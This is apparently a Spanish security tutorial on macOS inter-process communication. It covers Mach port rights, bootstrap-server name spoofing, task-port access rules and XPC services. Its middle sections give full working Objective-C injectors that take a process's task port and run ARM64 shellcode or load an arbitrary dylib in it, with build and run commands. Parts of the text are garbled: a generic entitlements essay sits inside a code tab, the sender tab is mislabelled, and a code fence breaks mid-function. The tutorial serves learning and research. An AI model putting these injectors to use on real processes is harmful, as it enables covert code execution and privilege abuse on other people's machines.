## IPC de macOS - Comunicación entre procesos

Mach utiliza **tareas** como la **unidad más pequeña** para compartir recursos, y cada tarea puede contener **múltiples hilos**. Estas **tareas y hilos se asignan 1:1 a procesos y hilos POSIX**.

La comunicación entre tareas se realiza a través de la Comunicación entre Procesos de Mach (IPC), utilizando canales de comunicación unidireccionales. **Los mensajes se transfieren entre puertos**, que actúan como **colas de mensajes** gestionadas por el kernel.

Los derechos de puerto, que definen las operaciones que una tarea puede realizar, son clave para esta comunicación. Los posibles **derechos de puerto** son:

* **Derecho de recepción**, que permite recibir mensajes enviados al puerto. Los puertos de Mach son colas MPSC (múltiples productores, un solo consumidor), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de las tuberías, donde varios procesos pueden tener descriptores de archivo para el extremo de lectura de una tubería).
* Una **tarea con el derecho de recepción** puede recibir mensajes y **crear derechos de envío**, lo que le permite enviar mensajes. Originalmente, solo la **propia tarea tiene el derecho de recepción sobre su puerto**.
* **Derecho de envío**, que permite enviar mensajes al puerto.
* **Derecho de envío único**, que permite enviar un mensaje al puerto y luego desaparece.
* **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden usar para escuchar varios puertos simultáneamente, como `select`/`poll`/`epoll`/`kqueue` en Unix.
* **Nombre muerto**, que no es un derecho de puerto real, sino simplemente un marcador de posición. Cuando se destruye un puerto, todos los derechos de puerto existentes para el puerto se convierten en nombres muertos.

**Las tareas pueden transferir derechos de ENVÍO a otros**, lo que les permite enviar mensajes de vuelta. **Los derechos de ENVÍO también se pueden clonar, por lo que una tarea puede duplicar y dar el derecho a una tercera tarea**. Esto, combinado con un proceso intermedio conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.

#### Pasos:

Como se menciona, para establecer el canal de comunicación, está involucrado el **servidor de arranque** (**launchd** en mac).

1. La tarea **A** inicia un **nuevo puerto**, obteniendo un **derecho de RECEPCIÓN** en el proceso.
2. La tarea **A**, siendo la titular del derecho de RECEPCIÓN, **genera un derecho de ENVÍO para el puerto**.
3. La tarea **A** establece una **conexión** con el **servidor de arranque**, proporcionando el **nombre del servicio del puerto** y el **derecho de ENVÍO** a través de un procedimiento conocido como registro de arranque.
4. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una **búsqueda de arranque para el nombre del servicio**. Si tiene éxito, el **servidor duplica el derecho de ENVÍO** recibido de la tarea A y **lo transmite a la tarea B**.
5. Al adquirir un derecho de ENVÍO, la tarea **B** es capaz de **formular** un **mensaje** y enviarlo **a la tarea A**.

El servidor de arranque **no puede autenticar** el nombre del servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **suplantar cualquier tarea del sistema**, como **falsamente reclamar un nombre de servicio de autorización** y luego aprobar cada solicitud.

Luego, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios protegidos por SIP: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto a cada nombre de servicio, también se almacena el **binario asociado**. El servidor de arranque creará y mantendrá un **derecho de RECEPCIÓN para cada uno de estos nombres de servicio**.

Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente**. Cuando se busca un nombre de servicio, launchd inicia el servicio dinámicamente. El nuevo flujo de trabajo es el siguiente:

* La tarea **B** inicia una **búsqueda de arranque** para un nombre de servicio.
* **launchd** verifica si la tarea se está ejecutando y, si no lo está, **la inicia**.
* La tarea **A** (el servicio) realiza un **registro de arranque**. Aquí, el servidor de arranque crea un derecho de ENVÍO, lo retiene y **transfiere el derecho de RECEPCIÓN a la tarea A**.
* launchd duplica el **derecho de ENVÍO y lo envía a la tarea B**.

Sin embargo, este proceso solo se aplica a las tareas del sistema predefinidas. Las tareas que no son del sistema aún operan como se describe originalmente, lo que podría permitir la suplantación.
### Ejemplo de código

Observe cómo el **emisor** **asigna** un puerto, crea un **derecho de envío** para el nombre `org.darlinghq.example` y lo envía al **servidor de arranque** mientras que el emisor solicitó el **derecho de envío** de ese nombre y lo usó para **enviar un mensaje**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### Puertos privilegiados

* **Puerto de host**: Si un proceso tiene el privilegio **Enviar** sobre este puerto, puede obtener **información** sobre el **sistema** (por ejemplo, `host_processor_info`).
* **Puerto de host privado**: Un proceso con el derecho de **Enviar** sobre este puerto puede realizar **acciones privilegiadas** como cargar una extensión del kernel. El **proceso necesita ser root** para obtener este permiso.
* Además, para llamar a la API **`kext_request`** es necesario tener la autorización **`com.apple.private.kext`**, que solo se otorga a los binarios de Apple.
* **Puerto de nombre de tarea**: Una versión no privilegiada del _puerto de tarea_. Hace referencia a la tarea, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.
* **Puerto de tarea** (también conocido como puerto del kernel)**:** Con el permiso de Enviar sobre este puerto, es posible controlar la tarea (leer/escribir memoria, crear hilos...).
* Llame a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea del llamador. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()`ing un binario suid). La única forma de generar una tarea y obtener su puerto es realizar la ["danza de intercambio de puertos"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) mientras se realiza un `fork()`.
* Estas son las restricciones para acceder al puerto (de `macos_task_policy` del binario `AppleMobileFileIntegrity`):
* Si la aplicación tiene la autorización **`com.apple.security.get-task-allow`**, los procesos del **mismo usuario pueden acceder al puerto de tarea** (comúnmente agregado por Xcode para depurar). El proceso de **notarización** no lo permitirá en las versiones de producción.
* Las aplicaciones con la autorización **`com.apple.system-task-ports`** pueden obtener el **puerto de tarea para cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se otorga a las aplicaciones de Apple.
* **Root puede acceder a los puertos de tarea** de las aplicaciones **no** compiladas con un tiempo de ejecución **fortificado** (y no de Apple).

### Inyección de proceso de shellcode a través del puerto de tarea

Puede obtener un shellcode desde:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
[NSThread sleepForTimeInterval:99999];
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}

## Entitlements

Los entitlements son una forma de especificar los permisos que una aplicación necesita para realizar ciertas acciones en el sistema. Estos permisos pueden incluir acceso a ciertos recursos del sistema, como la cámara o el micrófono, o la capacidad de realizar ciertas operaciones de red. Los entitlements se especifican en un archivo llamado `entitlements.plist`, que se incluye en el paquete de la aplicación.

Cuando una aplicación se ejecuta, el sistema operativo verifica los entitlements de la aplicación para asegurarse de que tiene los permisos necesarios para realizar las acciones que está intentando realizar. Si la aplicación no tiene los entitlements necesarios, el sistema operativo puede denegar la acción o mostrar una alerta al usuario pidiendo permiso.

Los entitlements también se utilizan para limitar los privilegios de una aplicación. Por ejemplo, una aplicación puede tener un entitlement que le permite acceder a la cámara, pero no a la ubicación del usuario. Esto significa que la aplicación puede tomar fotos, pero no puede acceder a la información de ubicación del usuario.

En general, es importante revisar cuidadosamente los entitlements de una aplicación antes de instalarla o ejecutarla. Si una aplicación tiene demasiados entitlements o entitlements innecesarios, puede representar un riesgo de seguridad para el sistema.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compila** el programa anterior y agrega los **entitlements** para poder inyectar código con el mismo usuario (si no, necesitarás usar **sudo**).

<details>

<summary>injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid>", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pid-of-mysleep>
```
### Inyección de Dylib en proceso a través del puerto de tarea

En macOS, los **hilos** pueden ser manipulados a través de **Mach** o utilizando la **API posix `pthread`**. El hilo que generamos en la inyección anterior fue generado utilizando la API Mach, por lo que **no es compatible con posix**.

Fue posible **inyectar un shellcode simple** para ejecutar un comando porque **no necesitaba trabajar con APIs compatibles con posix**, solo con Mach. **Inyecciones más complejas** necesitarían que el **hilo** también sea **compatible con posix**.

Por lo tanto, para **mejorar el shellcode**, debería llamar a **`pthread_create_from_mach_thread`**, lo que **creará un pthread válido**. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar nuestra dylib** desde el sistema.

Puede encontrar **ejemplos de dylibs** en (por ejemplo, el que genera un registro y luego puede escucharlo):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}
```c
if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create desde hilo mach @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Escribir el shellcode en la memoria asignada
kr = mach_vm_write(remoteTask,                   // Puerto de tarea
remoteCode64,                 // Dirección virtual (destino)
(vm_address_t) injectedCode,  // Origen
0xa9);                       // Longitud del origen


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"No se pudo escribir en la memoria del hilo remoto: Error %s\n", mach_error_string(kr));
return (-3);
}


// Establecer los permisos en la memoria asignada para el código
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"No se pudieron establecer los permisos de memoria para el código del hilo remoto: Error %s\n", mach_error_string(kr));
return (-4);
}

// Establecer los permisos en la memoria asignada para la pila
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"No se pudieron establecer los permisos de memoria para la pila del hilo remoto: Error %s\n", mach_error_string(kr));
return (-4);
}


// Crear hilo para ejecutar el shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // esta es la pila real
//remoteStack64 -= 8;  // se necesita alineación de 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Pila remota 64  0x%llx, el código remoto es %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"No se pudo crear el hilo remoto: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Uso: %s _pid_ _acción_\n", argv[0]);
fprintf (stderr, "   _acción_: ruta a una dylib en el disco\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib no encontrada\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
## XPC

### Información básica

XPC, que significa Comunicación Interprocesos (IPC) de XNU (el kernel utilizado por macOS), es un marco para la **comunicación entre procesos** en macOS e iOS. XPC proporciona un mecanismo para realizar **llamadas de método seguras y asíncronas entre diferentes procesos** en el sistema. Es parte del paradigma de seguridad de Apple, lo que permite la **creación de aplicaciones separadas por privilegios** donde cada **componente** se ejecuta con **solo los permisos que necesita** para hacer su trabajo, limitando así el daño potencial de un proceso comprometido.

XPC utiliza una forma de Comunicación Interprocesos (IPC), que es un conjunto de métodos para que los diferentes programas que se ejecutan en el mismo sistema envíen datos de ida y vuelta.

Los principales beneficios de XPC incluyen:

1. **Seguridad**: Al separar el trabajo en diferentes procesos, cada proceso puede recibir solo los permisos que necesita. Esto significa que incluso si un proceso está comprometido, tiene una capacidad limitada para hacer daño.
2. **Estabilidad**: XPC ayuda a aislar los fallos en el componente donde ocurren. Si un proceso falla, se puede reiniciar sin afectar al resto del sistema.
3. **Rendimiento**: XPC permite una fácil concurrencia, ya que se pueden ejecutar diferentes tareas simultáneamente en diferentes procesos.

El único **inconveniente** es que **separar una aplicación en varios procesos** para que se comuniquen a través de XPC es **menos eficiente**. Pero en los sistemas actuales esto no es casi perceptible y los beneficios son mucho mejores.

Un ejemplo se puede ver en QuickTime Player, donde un componente que utiliza XPC es responsable de la decodificación de video. El componente está diseñado específicamente para realizar tareas computacionales, por lo que, en caso de una violación, no proporcionaría ningún beneficio útil al atacante, como acceso a archivos o a la red.

### Servicios XPC específicos de la aplicación

Los componentes XPC de una aplicación están **dentro de la aplicación en sí**. Por ejemplo, en Safari se pueden encontrar en **`/Applications/Safari.app/Contents/XPCServices`**. Tienen la extensión **`.xpc`** (como **`com.apple.Safari.SandboxBroker.xpc`**) y también son **paquetes** con el binario principal dentro de él: `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`

Como puede estar pensando, un **componente XPC tendrá diferentes permisos y privilegios** que los otros componentes XPC o el binario principal de la aplicación. EXCEPTO si un servicio XPC está configurado con [**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession) establecido en "True" en su archivo **Info.plist**. En este caso, el servicio XPC se ejecutará en la misma sesión de seguridad que la aplicación que lo llamó.

Los servicios XPC se **inician** por **launchd** cuando se requieren y se **apagan** una vez que todas las tareas están **completas** para liberar los recursos del sistema. **Los componentes XPC específicos de la aplicación solo pueden ser utilizados por la aplicación**, lo que reduce el riesgo asociado con posibles vulnerabilidades.

### Servicios XPC de todo el sistema

Los **servicios XPC de todo el sistema** son accesibles para todos los usuarios. Estos servicios, ya sean de tipo launchd o Mach, deben **definirse en archivos plist** ubicados en directorios especificados como **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`** o **`/Library/LaunchAgents`**.

Estos archivos plist tendrán una clave llamada **`MachServices`** con el nombre del servicio y una clave llamada **`Program`** con la ruta al binario:
```xml
cat /Library/LaunchDaemons/com.jamf.management.daemon.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Program</key>
<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
<key>AbandonProcessGroup</key>
<true/>
<key>KeepAlive</key>
<true/>
<key>Label</key>
<string>com.jamf.management.daemon</string>
<key>MachServices</key>
<dict>
<key>com.jamf.management.daemon.aad</key>
<true/>
<key>com.jamf.management.daemon.agent</key>
<true/>
<key>com.jamf.management.daemon.binary</key>
<true/>
<key>com.jamf.management.daemon.selfservice</key>
<true/>
<key>com.jamf.management.daemon.service</key>
<true/>
</dict>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Los que están en **`LaunchDameons`** son ejecutados por root. Por lo tanto, si un proceso no privilegiado puede comunicarse con uno de ellos, podría ser capaz de escalar privilegios.

### Mensajes de eventos XPC

